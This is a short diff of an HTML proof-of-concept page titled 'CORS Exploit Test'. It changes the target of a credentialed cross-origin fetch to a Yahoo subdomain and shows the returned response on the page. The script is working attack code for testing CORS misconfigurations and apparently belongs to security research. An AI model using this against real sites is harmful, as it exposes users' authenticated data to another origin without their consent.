@@ -4,16 +4,17 @@
     <h1>CORS Exploit Test</h1>
     <pre id="output">Loading...</pre>
     <script>
-      fetch("https://tw.autos.yahoo.com", {
+      fetch("https://d3vtw.autos.yahoo.com", {
         method: "GET",
         credentials: "include",
         headers: {
           "X-Pwn": "cors-test"
         }
       })
-      .then(response => response.text())
-      .then(data => document.getElementById("output").innerText = data)
-      .catch(err => document.getElementById("output").innerText = "Error: " + err);
+      .then(r => r.text())
+      .then(t => document.getElementById("output").innerText = t)
+      .catch(e => document.getElementById("output").innerText = "Error: " + e);
+
 
     </script>
   </body>
